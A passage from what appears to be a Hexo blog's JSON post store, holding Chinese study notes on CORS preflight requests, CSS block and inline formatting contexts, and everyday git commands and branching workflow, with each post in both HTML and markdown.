请求。具体就是浏览器发现这次请求是简单请求，就主动在头信息之中，增加一个 origin 字段</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//让我们看看，在这个场景中，浏览器会发送什么的请求到服务器，而服务器又会返回什么给浏览器：</span></span><br><span class=\"line\">GET /resources/public-data/ HTTP/<span class=\"number\">1.1</span></span><br><span class=\"line\">Host: bar.other</span><br><span class=\"line\">User-Agent: Mozilla/<span class=\"number\">5.0</span> (Macintosh; U; Intel Mac OS X <span class=\"number\">10.5</span>; en-US; rv:<span class=\"number\">1.9</span><span class=\"number\">.1</span>b3pre) Gecko/<span class=\"number\">20081130</span></span><br><span class=\"line\">Minefield/<span class=\"number\">3.1</span>b3pre</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;</span><br><span class=\"line\">Accept-Language: en-us,en;q=<span class=\"number\">0.5</span></span><br><span class=\"line\">Accept-Encoding: gzip,deflate</span><br><span class=\"line\">Accept-Charset: ISO<span class=\"number\">-8859</span><span class=\"number\">-1</span>,utf<span class=\"number\">-8</span>;q=<span class=\"number\">0.7</span>,*;q=<span class=\"number\">0.7</span></span><br><span class=\"line\">Connection: keep-alive</span><br><span class=\"line\">Referer: http:<span class=\"comment\">//foo.example/examples/access-control/simpleXSInvocation.html</span></span><br><span class=\"line\">Origin: http:<span class=\"comment\">//foo.example //该请求来自于 http://foo.exmaple。</span></span><br><span class=\"line\"><span class=\"comment\">//以上是浏览器发送请求</span></span><br><span class=\"line\"></span><br><span class=\"line\">HTTP/<span class=\"number\">1.1</span> <span class=\"number\">200</span> OK</span><br><span class=\"line\"><span class=\"built_in\">Date</span>: Mon, <span class=\"number\">01</span> Dec <span class=\"number\">2008</span> <span class=\"number\">00</span>:<span class=\"number\">23</span>:<span class=\"number\">53</span> GMT</span><br><span class=\"line\">Server: Apache/<span class=\"number\">2.0</span><span class=\"number\">.61</span></span><br><span class=\"line\">Access-Control-Allow-Origin: * <span class=\"comment\">//这表明服务器接受来自任何站点的跨站请求。如果设置为http://foo.example。其它站点就不能跨站访问 http://bar.other 的资源了。</span></span><br><span class=\"line\">Keep-Alive: timeout=<span class=\"number\">2</span>, max=<span class=\"number\">100</span></span><br><span class=\"line\">Connection: Keep-Alive</span><br><span class=\"line\">Transfer-Encoding: chunked</span><br><span class=\"line\">Content-Type: application/xml</span><br><span class=\"line\"><span class=\"comment\">//以上是服务器返回信息给浏览器</span></span><br></pre></td></tr></table></figure>\n<h6 id=\"服务器返回的与-CORS-有关的字段\"><a href=\"#服务器返回的与-CORS-有关的字段\" class=\"headerlink\" title=\"服务器返回的与 CORS 有关的字段\"></a>服务器返回的与 CORS 有关的字段</h6><blockquote>\n<p>一般都是以 Access-Control 开头</p>\n</blockquote>\n<ul>\n<li>Access-Control-Allow-Origin 接受域名的请求，必须的</li>\n<li>Access-Control-Allow-Credentials 可选，表示允不允许发送 cookie。如果需要发送，浏览器的 ajax 请求要打开 withCredentials 属性（xhr.withCredentials = true;）</li>\n<li>Access-Control-Expose-Headers 可选。因为 cors 请求，xhr 对象的 getResponseHeader()方法只能拿到 6 个基本字段：Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma。如果想要拿到其他字段，只能在服务器里面指定，比如 getResponseHeader(‘FooBar’)可以返回 FooBar 字段</li>\n</ul>\n<h5 id=\"非简单请求\"><a href=\"#非简单请求\" class=\"headerlink\" title=\"非简单请求\"></a>非简单请求</h5><blockquote>\n<p>非简单请求是对服务器有特殊要求的请求，比如请求方法是 put 和 delete，或者 content-type 是 application/json</p>\n</blockquote>\n<ul>\n<li>会在正式通信之前，增加一次 http 查询请求，称为预检请求</li>\n<li>浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些 HTTP 动词和头信息字段。只有得到肯定答复，浏览器才会发出正式的 XMLHttpRequest 请求，否则就报错</li>\n<li>预检请求的方法是 options，表示这个请求是询问的</li>\n<li>浏览器发出的预请求</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//浏览器</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> url = <span class=\"string\">\"http://api.alice.com/cors\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> xhr = <span class=\"keyword\">new</span> XMLHttpRequest();</span><br><span class=\"line\">xhr.open(<span class=\"string\">\"PUT\"</span>, url, <span class=\"literal\">true</span>);</span><br><span class=\"line\">xhr.setRequestHeader(<span class=\"string\">\"X-Custom-Header\"</span>, <span class=\"string\">\"value\"</span>);</span><br><span class=\"line\">xhr.send();</span><br><span class=\"line\"><span class=\"comment\">//http头</span></span><br><span class=\"line\">OPTIONS /cors HTTP/<span class=\"number\">1.1</span></span><br><span class=\"line\">Origin: http:<span class=\"comment\">//api.bob.com</span></span><br><span class=\"line\">Access-Control-Request-Method: PUT<span class=\"comment\">//（必须的）告知请求是什么方法</span></span><br><span class=\"line\">Access-Control-Request-Headers: X-Custom-Header<span class=\"comment\">//发送额外的头部信息，以逗号分割</span></span><br><span class=\"line\">Host: api.alice.com</span><br><span class=\"line\">Accept-Language: en-US</span><br><span class=\"line\">Connection: keep-alive</span><br></pre></td></tr></table></figure>\n<ul>\n<li>服务器的回应,在检查 origin，method 和 headers 字段后</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/<span class=\"number\">1.1</span> <span class=\"number\">200</span> OK</span><br><span class=\"line\"><span class=\"built_in\">Date</span>: Mon, <span class=\"number\">01</span> Dec <span class=\"number\">2008</span> <span class=\"number\">01</span>:<span class=\"number\">15</span>:<span class=\"number\">39</span> GMT</span><br><span class=\"line\">Server: Apache/<span class=\"number\">2.0</span><span class=\"number\">.61</span> (Unix)</span><br><span class=\"line\">Access-Control-Allow-Origin: http:<span class=\"comment\">//api.bob.com//（关键）</span></span><br><span class=\"line\">Access-Control-Allow-Methods: GET, POST, PUT<span class=\"comment\">//必须，返回的是所有支持方法，而不但是浏览器请求的那个方法，这样是避免多次预检请求</span></span><br><span class=\"line\">Access-Control-Allow-Headers: X-Custom-Header<span class=\"comment\">//如果浏览器有，则这个字段也是必须的</span></span><br><span class=\"line\">Access-Control-Max-Age: <span class=\"number\">1728000</span> <span class=\"comment\">//本次预检请求的有效期，单位是秒，允许缓存该条回应多少秒。在此期间，不用发出另一条预检请求。</span></span><br><span class=\"line\">Content-Type: text/html; charset=utf<span class=\"number\">-8</span></span><br><span class=\"line\">Content-Encoding: gzip</span><br><span class=\"line\">Content-Length: <span class=\"number\">0</span></span><br><span class=\"line\">Keep-Alive: timeout=<span class=\"number\">2</span>, max=<span class=\"number\">100</span></span><br><span class=\"line\">Connection: Keep-Alive</span><br><span class=\"line\">Content-Type: text/plain</span><br></pre></td></tr></table></figure>\n<p>一旦服务器通过了预检请求，以后每次浏览器的请求都跟简单请求一样</p>\n<ul>\n<li>优点：CORS 的优点：CORS 支持所有类型的 HTTP 请求，是跨域 HTTP 请求的根本解决方案。</li>\n</ul>\n"},{"title":"css中的四种fc（格式上下文）","date":"2018-05-28T03:47:47.000Z","_content":"\n# 什么是 FC\n\n> formatting context 的缩写，格式上下文\n\n* 是 css2.1 的一个规范\n* 是页面中的一块渲染区域，并且有一套渲染规则，它决定了其子元素将如何定位，以及和其他元素的关系和相互作用\n* css2.1 定义了两个格式上下文\n  * BFC（block）\n  * IFC（inline）\n* css3 定义了两个格式上下文\n  * GFC(grid)\n  * FFC(flex)\n\n# 概念\n\n* block-level boxes:display 属性值为'block'，‘list-item’,‘table’会生成一个 block-level box，这样盒子会参与到 bfc（一种布局方式）中\n* containing block:在浏览器内，想要把一个元素画出来，至少要知道定位和尺寸。定位有三种，无论哪一种都要先找到所在的 containing block，相当于一个大箱子里面摆很多小盒子，小盒子怎么摆取决于大箱子\n\n# BFC\n\n> 是一个独立的渲染区域，只有 block-level boxes 参与，规定了内部的 block-level box 如何布局，并且与这个区域外部毫不相干。\n\n## 布局规则\n\n* 内部的 box 会在垂直方向一个接着一个的放置\n* box 垂直方向的距离由 margin 决定，属于同一个 BFC 的两个相邻 box 的 margin 会发生重叠\n* bfc 的区域不会与 float box 重叠（可以用来实现两栏布局）\n* bfc 就是页面上一个隔离的独立容器，容器里面的子元素不会影响到外面的元素\n\n## 如何触发\n\n* 根元素（body）\n* float 属性不为 none\n* position 为 abs 或者 fixed\n* display 为 inline-block, table-cell, table-caption(表格相关的)\n* 在 BFC 中，每一个盒子的左外边缘（margin-left）会触碰到容器的左边缘(border-left)（对于从右到左的格式来说，则触碰到右边缘）\n* overflow 不为 visible\n\n# 推荐阅读\n\n* [理解 BFC 的原理及其作用](https://blog.csdn.net/web_hwg/article/details/78470765)\n* [深入理解 BFC 和 Margin Collapse](https://www.w3cplus.com/css/understanding-bfc-and-margin-collapse.html)\n* [理解 css 中的 bfc](https://www.w3cplus.com/css/understanding-block-formatting-contexts-in-css.html)\n\n# IFC\n\n> 内联格式化上下文\n\n## 如何触发\n\n* 元素满足 inline-level box\n\n## 布局特点\n\n* 与 BFC 的区别是，水平方向的\n* 内部元素全是 inline-level\n* 如果由一个子节点是 block-level，父节点就要生成 BFC，但是 inline 元素怎么放进 BFC（浏览器会生成匿名盒子来容纳这些 inline 元素）\n* IFC 中时不可能有块级元素的，当插入块级元素时（如 p 中插入 div）会产生两个匿名块与 div 分隔开，即产生两个 IFC，每个 IFC 对外表现为块级元素，与 div 垂直排列。\n* 每一行的多个内联元素都会生成同一个 line-box（线框）\n* 计算行框里的各行内级框的高度。对于置换元素、行内块元素、行内表格元素来说，这是边界框的高度，对于行内框来说，这是其 ‘line-height’。\n\n## 具体作用\n\n* 水平居中：当一个块要在环境中水平居中时，设置其为 inline-block 则会在外层产生 IFC，通过设置父容器 text-align:center 则可以使其水平居中。\n* 垂直居中：创建一个 IFC，用其中一个元素撑开父元素的高度，然后设置其 vertical-align:middle，其他行内元素则可以在此父元素下垂直居中。\n\n## 推荐阅读\n\n* [浅析 CSS 中的 BFC 和 IFC](https://www.bbsmax.com/A/rV573pX5PD/)\n* [line box，inline box 及 vertical-align 分析](https://segmentfault.com/a/1190000008723748)\n","source":"_posts/study-formatting-context.md","raw":"---\ntitle: css中的四种fc（格式上下文）\ndate: 2018-05-28 11:47:47\ntags: css\n---\n\n# 什么是 FC\n\n> formatting context 的缩写，格式上下文\n\n* 是 css2.1 的一个规范\n* 是页面中的一块渲染区域，并且有一套渲染规则，它决定了其子元素将如何定位，以及和其他元素的关系和相互作用\n* css2.1 定义了两个格式上下文\n  * BFC（block）\n  * IFC（inline）\n* css3 定义了两个格式上下文\n  * GFC(grid)\n  * FFC(flex)\n\n# 概念\n\n* block-level boxes:display 属性值为'block'，‘list-item’,‘table’会生成一个 block-level box，这样盒子会参与到 bfc（一种布局方式）中\n* containing block:在浏览器内，想要把一个元素画出来，至少要知道定位和尺寸。定位有三种，无论哪一种都要先找到所在的 containing block，相当于一个大箱子里面摆很多小盒子，小盒子怎么摆取决于大箱子\n\n# BFC\n\n> 是一个独立的渲染区域，只有 block-level boxes 参与，规定了内部的 block-level box 如何布局，并且与这个区域外部毫不相干。\n\n## 布局规则\n\n* 内部的 box 会在垂直方向一个接着一个的放置\n* box 垂直方向的距离由 margin 决定，属于同一个 BFC 的两个相邻 box 的 margin 会发生重叠\n* bfc 的区域不会与 float box 重叠（可以用来实现两栏布局）\n* bfc 就是页面上一个隔离的独立容器，容器里面的子元素不会影响到外面的元素\n\n## 如何触发\n\n* 根元素（body）\n* float 属性不为 none\n* position 为 abs 或者 fixed\n* display 为 inline-block, table-cell, table-caption(表格相关的)\n* 在 BFC 中，每一个盒子的左外边缘（margin-left）会触碰到容器的左边缘(border-left)（对于从右到左的格式来说，则触碰到右边缘）\n* overflow 不为 visible\n\n# 推荐阅读\n\n* [理解 BFC 的原理及其作用](https://blog.csdn.net/web_hwg/article/details/78470765)\n* [深入理解 BFC 和 Margin Collapse](https://www.w3cplus.com/css/understanding-bfc-and-margin-collapse.html)\n* [理解 css 中的 bfc](https://www.w3cplus.com/css/understanding-block-formatting-contexts-in-css.html)\n\n# IFC\n\n> 内联格式化上下文\n\n## 如何触发\n\n* 元素满足 inline-level box\n\n## 布局特点\n\n* 与 BFC 的区别是，水平方向的\n* 内部元素全是 inline-level\n* 如果由一个子节点是 block-level，父节点就要生成 BFC，但是 inline 元素怎么放进 BFC（浏览器会生成匿名盒子来容纳这些 inline 元素）\n* IFC 中时不可能有块级元素的，当插入块级元素时（如 p 中插入 div）会产生两个匿名块与 div 分隔开，即产生两个 IFC，每个 IFC 对外表现为块级元素，与 div 垂直排列。\n* 每一行的多个内联元素都会生成同一个 line-box（线框）\n* 计算行框里的各行内级框的高度。对于置换元素、行内块元素、行内表格元素来说，这是边界框的高度，对于行内框来说，这是其 ‘line-height’。\n\n## 具体作用\n\n* 水平居中：当一个块要在环境中水平居中时，设置其为 inline-block 则会在外层产生 IFC，通过设置父容器 text-align:center 则可以使其水平居中。\n* 垂直居中：创建一个 IFC，用其中一个元素撑开父元素的高度，然后设置其 vertical-align:middle，其他行内元素则可以在此父元素下垂直居中。\n\n## 推荐阅读\n\n* [浅析 CSS 中的 BFC 和 IFC](https://www.bbsmax.com/A/rV573pX5PD/)\n* [line box，inline box 及 vertical-align 分析](https://segmentfault.com/a/1190000008723748)\n","slug":"study-formatting-context","published":1,"updated":"2018-06-04T13:40:55.104Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034qr002m0ioftaw740x6","content":"<h1 id=\"什么是-FC\"><a href=\"#什么是-FC\" class=\"headerlink\" title=\"什么是 FC\"></a>什么是 FC</h1><blockquote>\n<p>formatting context 的缩写，格式上下文</p>\n</blockquote>\n<ul>\n<li>是 css2.1 的一个规范</li>\n<li>是页面中的一块渲染区域，并且有一套渲染规则，它决定了其子元素将如何定位，以及和其他元素的关系和相互作用</li>\n<li>css2.1 定义了两个格式上下文<ul>\n<li>BFC（block）</li>\n<li>IFC（inline）</li>\n</ul>\n</li>\n<li>css3 定义了两个格式上下文<ul>\n<li>GFC(grid)</li>\n<li>FFC(flex)</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"概念\"><a href=\"#概念\" class=\"headerlink\" title=\"概念\"></a>概念</h1><ul>\n<li>block-level boxes:display 属性值为’block’，‘list-item’,‘table’会生成一个 block-level box，这样盒子会参与到 bfc（一种布局方式）中</li>\n<li>containing block:在浏览器内，想要把一个元素画出来，至少要知道定位和尺寸。定位有三种，无论哪一种都要先找到所在的 containing block，相当于一个大箱子里面摆很多小盒子，小盒子怎么摆取决于大箱子</li>\n</ul>\n<h1 id=\"BFC\"><a href=\"#BFC\" class=\"headerlink\" title=\"BFC\"></a>BFC</h1><blockquote>\n<p>是一个独立的渲染区域，只有 block-level boxes 参与，规定了内部的 block-level box 如何布局，并且与这个区域外部毫不相干。</p>\n</blockquote>\n<h2 id=\"布局规则\"><a href=\"#布局规则\" class=\"headerlink\" title=\"布局规则\"></a>布局规则</h2><ul>\n<li>内部的 box 会在垂直方向一个接着一个的放置</li>\n<li>box 垂直方向的距离由 margin 决定，属于同一个 BFC 的两个相邻 box 的 margin 会发生重叠</li>\n<li>bfc 的区域不会与 float box 重叠（可以用来实现两栏布局）</li>\n<li>bfc 就是页面上一个隔离的独立容器，容器里面的子元素不会影响到外面的元素</li>\n</ul>\n<h2 id=\"如何触发\"><a href=\"#如何触发\" class=\"headerlink\" title=\"如何触发\"></a>如何触发</h2><ul>\n<li>根元素（body）</li>\n<li>float 属性不为 none</li>\n<li>position 为 abs 或者 fixed</li>\n<li>display 为 inline-block, table-cell, table-caption(表格相关的)</li>\n<li>在 BFC 中，每一个盒子的左外边缘（margin-left）会触碰到容器的左边缘(border-left)（对于从右到左的格式来说，则触碰到右边缘）</li>\n<li>overflow 不为 visible</li>\n</ul>\n<h1 id=\"推荐阅读\"><a href=\"#推荐阅读\" class=\"headerlink\" title=\"推荐阅读\"></a>推荐阅读</h1><ul>\n<li><a href=\"https://blog.csdn.net/web_hwg/article/details/78470765\" target=\"_blank\" rel=\"noopener\">理解 BFC 的原理及其作用</a></li>\n<li><a href=\"https://www.w3cplus.com/css/understanding-bfc-and-margin-collapse.html\" target=\"_blank\" rel=\"noopener\">深入理解 BFC 和 Margin Collapse</a></li>\n<li><a href=\"https://www.w3cplus.com/css/understanding-block-formatting-contexts-in-css.html\" target=\"_blank\" rel=\"noopener\">理解 css 中的 bfc</a></li>\n</ul>\n<h1 id=\"IFC\"><a href=\"#IFC\" class=\"headerlink\" title=\"IFC\"></a>IFC</h1><blockquote>\n<p>内联格式化上下文</p>\n</blockquote>\n<h2 id=\"如何触发-1\"><a href=\"#如何触发-1\" class=\"headerlink\" title=\"如何触发\"></a>如何触发</h2><ul>\n<li>元素满足 inline-level box</li>\n</ul>\n<h2 id=\"布局特点\"><a href=\"#布局特点\" class=\"headerlink\" title=\"布局特点\"></a>布局特点</h2><ul>\n<li>与 BFC 的区别是，水平方向的</li>\n<li>内部元素全是 inline-level</li>\n<li>如果由一个子节点是 block-level，父节点就要生成 BFC，但是 inline 元素怎么放进 BFC（浏览器会生成匿名盒子来容纳这些 inline 元素）</li>\n<li>IFC 中时不可能有块级元素的，当插入块级元素时（如 p 中插入 div）会产生两个匿名块与 div 分隔开，即产生两个 IFC，每个 IFC 对外表现为块级元素，与 div 垂直排列。</li>\n<li>每一行的多个内联元素都会生成同一个 line-box（线框）</li>\n<li>计算行框里的各行内级框的高度。对于置换元素、行内块元素、行内表格元素来说，这是边界框的高度，对于行内框来说，这是其 ‘line-height’。</li>\n</ul>\n<h2 id=\"具体作用\"><a href=\"#具体作用\" class=\"headerlink\" title=\"具体作用\"></a>具体作用</h2><ul>\n<li>水平居中：当一个块要在环境中水平居中时，设置其为 inline-block 则会在外层产生 IFC，通过设置父容器 text-align:center 则可以使其水平居中。</li>\n<li>垂直居中：创建一个 IFC，用其中一个元素撑开父元素的高度，然后设置其 vertical-align:middle，其他行内元素则可以在此父元素下垂直居中。</li>\n</ul>\n<h2 id=\"推荐阅读-1\"><a href=\"#推荐阅读-1\" class=\"headerlink\" title=\"推荐阅读\"></a>推荐阅读</h2><ul>\n<li><a href=\"https://www.bbsmax.com/A/rV573pX5PD/\" target=\"_blank\" rel=\"noopener\">浅析 CSS 中的 BFC 和 IFC</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000008723748\" target=\"_blank\" rel=\"noopener\">line box，inline box 及 vertical-align 分析</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"什么是-FC\"><a href=\"#什么是-FC\" class=\"headerlink\" title=\"什么是 FC\"></a>什么是 FC</h1><blockquote>\n<p>formatting context 的缩写，格式上下文</p>\n</blockquote>\n<ul>\n<li>是 css2.1 的一个规范</li>\n<li>是页面中的一块渲染区域，并且有一套渲染规则，它决定了其子元素将如何定位，以及和其他元素的关系和相互作用</li>\n<li>css2.1 定义了两个格式上下文<ul>\n<li>BFC（block）</li>\n<li>IFC（inline）</li>\n</ul>\n</li>\n<li>css3 定义了两个格式上下文<ul>\n<li>GFC(grid)</li>\n<li>FFC(flex)</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"概念\"><a href=\"#概念\" class=\"headerlink\" title=\"概念\"></a>概念</h1><ul>\n<li>block-level boxes:display 属性值为’block’，‘list-item’,‘table’会生成一个 block-level box，这样盒子会参与到 bfc（一种布局方式）中</li>\n<li>containing block:在浏览器内，想要把一个元素画出来，至少要知道定位和尺寸。定位有三种，无论哪一种都要先找到所在的 containing block，相当于一个大箱子里面摆很多小盒子，小盒子怎么摆取决于大箱子</li>\n</ul>\n<h1 id=\"BFC\"><a href=\"#BFC\" class=\"headerlink\" title=\"BFC\"></a>BFC</h1><blockquote>\n<p>是一个独立的渲染区域，只有 block-level boxes 参与，规定了内部的 block-level box 如何布局，并且与这个区域外部毫不相干。</p>\n</blockquote>\n<h2 id=\"布局规则\"><a href=\"#布局规则\" class=\"headerlink\" title=\"布局规则\"></a>布局规则</h2><ul>\n<li>内部的 box 会在垂直方向一个接着一个的放置</li>\n<li>box 垂直方向的距离由 margin 决定，属于同一个 BFC 的两个相邻 box 的 margin 会发生重叠</li>\n<li>bfc 的区域不会与 float box 重叠（可以用来实现两栏布局）</li>\n<li>bfc 就是页面上一个隔离的独立容器，容器里面的子元素不会影响到外面的元素</li>\n</ul>\n<h2 id=\"如何触发\"><a href=\"#如何触发\" class=\"headerlink\" title=\"如何触发\"></a>如何触发</h2><ul>\n<li>根元素（body）</li>\n<li>float 属性不为 none</li>\n<li>position 为 abs 或者 fixed</li>\n<li>display 为 inline-block, table-cell, table-caption(表格相关的)</li>\n<li>在 BFC 中，每一个盒子的左外边缘（margin-left）会触碰到容器的左边缘(border-left)（对于从右到左的格式来说，则触碰到右边缘）</li>\n<li>overflow 不为 visible</li>\n</ul>\n<h1 id=\"推荐阅读\"><a href=\"#推荐阅读\" class=\"headerlink\" title=\"推荐阅读\"></a>推荐阅读</h1><ul>\n<li><a href=\"https://blog.csdn.net/web_hwg/article/details/78470765\" target=\"_blank\" rel=\"noopener\">理解 BFC 的原理及其作用</a></li>\n<li><a href=\"https://www.w3cplus.com/css/understanding-bfc-and-margin-collapse.html\" target=\"_blank\" rel=\"noopener\">深入理解 BFC 和 Margin Collapse</a></li>\n<li><a href=\"https://www.w3cplus.com/css/understanding-block-formatting-contexts-in-css.html\" target=\"_blank\" rel=\"noopener\">理解 css 中的 bfc</a></li>\n</ul>\n<h1 id=\"IFC\"><a href=\"#IFC\" class=\"headerlink\" title=\"IFC\"></a>IFC</h1><blockquote>\n<p>内联格式化上下文</p>\n</blockquote>\n<h2 id=\"如何触发-1\"><a href=\"#如何触发-1\" class=\"headerlink\" title=\"如何触发\"></a>如何触发</h2><ul>\n<li>元素满足 inline-level box</li>\n</ul>\n<h2 id=\"布局特点\"><a href=\"#布局特点\" class=\"headerlink\" title=\"布局特点\"></a>布局特点</h2><ul>\n<li>与 BFC 的区别是，水平方向的</li>\n<li>内部元素全是 inline-level</li>\n<li>如果由一个子节点是 block-level，父节点就要生成 BFC，但是 inline 元素怎么放进 BFC（浏览器会生成匿名盒子来容纳这些 inline 元素）</li>\n<li>IFC 中时不可能有块级元素的，当插入块级元素时（如 p 中插入 div）会产生两个匿名块与 div 分隔开，即产生两个 IFC，每个 IFC 对外表现为块级元素，与 div 垂直排列。</li>\n<li>每一行的多个内联元素都会生成同一个 line-box（线框）</li>\n<li>计算行框里的各行内级框的高度。对于置换元素、行内块元素、行内表格元素来说，这是边界框的高度，对于行内框来说，这是其 ‘line-height’。</li>\n</ul>\n<h2 id=\"具体作用\"><a href=\"#具体作用\" class=\"headerlink\" title=\"具体作用\"></a>具体作用</h2><ul>\n<li>水平居中：当一个块要在环境中水平居中时，设置其为 inline-block 则会在外层产生 IFC，通过设置父容器 text-align:center 则可以使其水平居中。</li>\n<li>垂直居中：创建一个 IFC，用其中一个元素撑开父元素的高度，然后设置其 vertical-align:middle，其他行内元素则可以在此父元素下垂直居中。</li>\n</ul>\n<h2 id=\"推荐阅读-1\"><a href=\"#推荐阅读-1\" class=\"headerlink\" title=\"推荐阅读\"></a>推荐阅读</h2><ul>\n<li><a href=\"https://www.bbsmax.com/A/rV573pX5PD/\" target=\"_blank\" rel=\"noopener\">浅析 CSS 中的 BFC 和 IFC</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000008723748\" target=\"_blank\" rel=\"noopener\">line box，inline box 及 vertical-align 分析</a></li>\n</ul>\n"},{"title":"工作中常用git命令","date":"2017-02-13T07:35:34.000Z","_content":"\n## 基础命令\n\n* git clone 克隆仓库\n\n* git checkout 切换分支\n\n* git add 添加文件\n\n* git commit 提交改动\n\n* git push 推送本地分支到远端\n\n* git merge 把某个分支的代码合并到当前分支\n\n* git pull = git fetch + git merge 把远端分支更新到本地\n\n* git status 当前分支状态\n\n> 我一般习惯配置别名 alias，比如 merge 变成 mg，这样少打几个字母\n\n## 常用命令组合\n\n1.丢掉本地未提交改动\n\ngit checkout -f\n\n2.丢掉本地已提交但未推送到远端的提交\n\ngit reset --hard origin/xxx\n\n## 测试和发布\n\n> 内部使用 gitlab\n\n* master 主分支：用于外网线上发布，永远保持跟线上一致\n* develop 分支：用于发布测试环境\n\n### 日常开发说明\n\n> 详情参见[git flow](http://www.ruanyifeng.com/blog/2015/12/git-workflow.html)\n\n* 日常开发从 master 拉一个分支 feature-xxx 分支到本地\n* 要发布测试环境，直接 mg 到 develop，然后发布\n* 要发布线上，直接 mg 到 master，然后发布\n* 日常紧急 bug 修复，可拉一个 hotfix 分支\n","source":"_posts/study-git.md","raw":"---\ntitle: 工作中常用git命令\ndate: 2017-02-13 15:35:34\ntags: git\n---\n\n## 基础命令\n\n* git clone 克隆仓库\n\n* git checkout 切换分支\n\n* git add 添加文件\n\n* git commit 提交改动\n\n* git push 推送本地分支到远端\n\n* git merge 把某个分支的代码合并到当前分支\n\n* git pull = git fetch + git merge 把远端分支更新到本地\n\n* git status 当前分支状态\n\n> 我一般习惯配置别名 alias，比如 merge 变成 mg，这样少打几个字母\n\n## 常用命令组合\n\n1.丢掉本地未提交改动\n\ngit checkout -f\n\n2.丢掉本地已提交但未推送到远端的提交\n\ngit reset --hard origin/xxx\n\n## 测试和发布\n\n> 内部使用 gitlab\n\n* master 主分支：用于外网线上发布，永远保持跟线上一致\n* develop 分支：用于发布测试环境\n\n### 日常开发说明\n\n> 详情参见[git flow](http://www.ruanyifeng.com/blog/2015/12/git-workflow.html)\n\n* 日常开发从 master 拉一个分支 feature-xxx 分支到本地\n* 要发布测试环境，直接 mg 到 develop，然后发布\n* 要发布线上，直接 mg 到 master，然后发布\n* 日常紧急 bug 修复，可拉一个 hotfix 分支\n","slug":"study-git","published":1,"updated":"2018-04-13T07:44:09.278Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034qw002o0iofv4d39k0b","content":"<h2 id=\"基础命令\"><a href=\"#基础命令\" class=\"headerlink\" title=\"基础命令\"></a>基础命令</h2><ul>\n<li><p>git clone 克隆仓库</p>\n</li>\n<li><p>git checkout 切换分支</p>\n</li>\n<li><p>git add 添加文件</p>\n</li>\n<li><p>git commit 提交改动</p>\n</li>\n<li><p>git push 推送本地分支到远端</p>\n</li>\n<li><p>git merge 把某个分支的代码合并到当前分支</p>\n</li>\n<li><p>git pull = git fetch + git merge 把远端分支更新到本地</p>\n</li>\n<li><p>git status 当前分支状态</p>\n</li>\n</ul>\n<blockquote>\n<p>我一般习惯配置别名 alias，比如 merge 变成 mg，这样少打几个字母</p>\n</blockquote>\n<h2 id=\"常用命令组合\"><a href=\"#常用命令组合\" class=\"headerlink\" title=\"常用命令组合\"></a>常用命令组合</h2><p>1.丢掉本地未提交改动</p>\n<p>git checkout -f</p>\n<p>2.丢掉本地已提交但未推送到远端的提交</p>\n<p>git reset –hard origin/xxx</p>\n<h2 id=\"测试和发布\"><a href=\"#测试和发布\" class=\"headerlink\" title=\"测试和发布\"></a>测试和发布</h2><blockquote>\n<p>内部使用 gitlab</p>\n</blockquote>\n<ul>\n<li>master 主分支：用于外网线上发布，永远保持跟线上一致</li>\n<li>develop 分支：用于发布测试环境</li>\n</ul>\n<h3 id=\"日常开发说明\"><a href=\"#日常开发说明\" class=\"headerlink\" title=\"日常开发说明\"></a>日常开发说明</h3><blockquote>\n<p>详情参见<a href=\"http://www.ruanyifeng.com/blog/2015/12/git-workflow.html\" target=\"_blank\" rel=\"noopener\">git flow</a></p>\n</blockquote>\n<ul>\n<li>日常开发从 master 拉一个分支 feature-xxx 分支到本地</li>\n<li>要发布测试环境，直接 mg 到 develop，然后发布</li>\n<li>要发布线上，直接 mg 到 master，然后发布</li>\n<li>日常紧急 bug 修复，可拉一个 hotfix 分支</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"基础命令\"><a href=\"#基础命令\" class=\"headerlink\" title=\"基础命令\"></a>基础命令</h2><ul>\n<li><p>git clone 克隆仓库</p>\n</li>\n<li><p>git checkout 切换分支</p>\n</li>\n<li><p>git add 添加文件</p>\n</li>\n<li><p>git commit 提交改动</p>\n</li>\n<li><p>git push 